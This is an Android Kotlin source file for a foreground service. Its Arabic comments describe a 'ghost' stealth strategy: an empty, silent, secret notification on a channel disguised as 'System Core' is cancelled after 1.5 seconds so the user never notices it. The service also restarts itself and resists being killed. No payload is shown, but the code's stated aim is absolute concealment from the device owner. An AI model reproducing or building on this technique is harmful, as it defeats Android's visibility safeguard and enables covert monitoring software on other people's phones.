package com.example.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" ديناميكي.
 *
 * استراتيجية التخفي المتقدمة (Dynamic Pulse Ghost):
 * - الإشعار الأساسي بأولوية IMPORTANCE_NONE (مخفي تماماً في شريط الحالة)
 * - يتم إلغاء الإشعار بعد 1500 مللي ثانية (شبح) لضمان عدم ملاحظته بشرياً
 * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
 * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك
 * - إخفاء المحتوى من شاشة القفل
 *
 * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
 * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
 * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
 *   بإضافة تأخير 1500ms قبل إلغاء الإشعار
 */
class ForegroundService : Service() {

    companion object {
        private const val CHANNEL_ID = "ghost_system_channel_v2"
        private const val NOTIFICATION_ID = 7771
        private const val TAG = "ForegroundService"
    }

    @Volatile
    private var isForeground = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // بدء الخدمة كـ Foreground إذا لم تكن قيد التشغيل
        if (!isForeground) {
            try {
                createGhostChannel()

                val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("")
                    .setContentText("")
                    .setSmallIcon(android.R.drawable.ic_menu_compass)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setOngoing(true) // ✅ ضروري لمنع قتل الخدمة
                    .setSilent(true)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .build()

                startForeground(NOTIFICATION_ID, notification)
                isForeground = true

                // ✅ تسجيل نجاح بدء الخدمة في السجل التشخيصي
                MainActivity.appendLogStatic("✅ Ghost notification started")

                // ✅ الحيلة الشبحية: إرضاء النظام ثم إلغاء الإشعار بعد 1.5 ثانية
                // هذا يمنع ForegroundServiceDidNotStartInTimeException
                // ويحقق اختفاء الإشعار خلال أجزاء من الثانية دون ملاحظة المستخدم
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                        nm.cancel(NOTIFICATION_ID)
                        MainActivity.appendLogStatic("✅ Ghost notification hidden (Stealth Mode)")
                        android.util.Log.d(TAG, "✅ Ghost notification hidden")
                    } catch (_: Exception) {
                        // تجاهل أخطاء الإلغاء
                    }
                }, 1500) // ✅ الانتظار 1.5 ثانية قبل الإلغاء

            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
                MainActivity.appendLogStatic("❌ Foreground service start error: ${e.message}")
            }
        }

        return START_STICKY
    }

    /**
     * إنشاء قناة الإشعارات بأدنى أولوية ممكنة (IMPORTANCE_NONE)
     * لمنع ظهور الإشعار في شريط الحالة أو إحداث أي إزعاج للمستخدم.
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Core",
                NotificationManager.IMPORTANCE_NONE // أدنى أولوية ممكنة
            ).apply {
                description = "Background system operations"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
            android.util.Log.d(TAG, "✅ Ghost notification channel created")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isForeground = false
        android.util.Log.d(TAG, "ForegroundService destroyed")
        MainActivity.appendLogStatic("🛑 ForegroundService destroyed")
        super.onDestroy()
    }
}
